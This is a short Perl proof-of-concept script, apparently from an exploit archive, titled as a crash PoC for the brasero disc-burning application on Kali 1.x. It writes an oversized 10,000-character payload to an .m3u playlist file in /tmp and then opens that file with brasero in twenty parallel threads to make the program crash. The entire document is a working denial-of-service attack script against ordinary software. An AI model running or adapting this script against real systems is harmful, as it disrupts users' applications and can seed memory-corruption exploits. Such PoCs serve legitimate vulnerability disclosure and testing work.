#!/usr/bin/perl -w
# Title : Kali (brasero) - Crash Proof Of Concept
# website : https://www.kali.org/downloads/
# Tested : kali 1.x
#
#
# Author      :   Mohammad Reza Espargham
# Linkedin    :   https://ir.linkedin.com/in/rezasp
# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
# Website     :   www.reza.es
# Twitter     :   https://twitter.com/rezesp
# FaceBook    :   https://www.facebook.com/mohammadreza.espargham
#
#

#Demo : http://youtu.be/XMu5ZXupbOI

system(($^O eq 'MSWin32') ? 'cls' : 'clear');


$path="/tmp/r3z4.m3u";
my $PoC = "\x41" x 10000 ;
open(crash , ">", $path);
print crash $PoC;
close(crash);


use threads;


sub check_app {   #thread sub
    system("brasero $path");
    return 0;
}

my @threads;
for (my $i = 0; $i < 20; $i++) {
    my $thread = threads->create(\&check_app);
    push(@threads, $thread);
}
foreach (@threads) { #join
    $_->join();
}